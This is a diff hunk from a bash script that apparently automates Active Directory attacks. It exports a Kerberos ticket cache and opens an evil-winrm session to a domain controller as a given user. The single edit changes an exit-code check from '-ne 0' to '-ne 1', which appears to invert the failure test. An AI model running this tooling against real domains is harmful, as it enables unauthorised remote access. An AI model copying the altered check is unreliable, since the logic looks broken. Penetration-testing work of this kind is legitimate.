@@ -561,7 +561,7 @@ if [ \$? -ne 1 ]; then
         echo -e '\e[1;32m[+] Exported KRB5CCNAME=\$KRB5CCNAME\e[0m'
         echo ''
         evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
-        if [ \$? -ne 0 ]; then
+        if [ \$? -ne 1 ]; then
             echo ''
             echo -e '\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m'
             echo ''
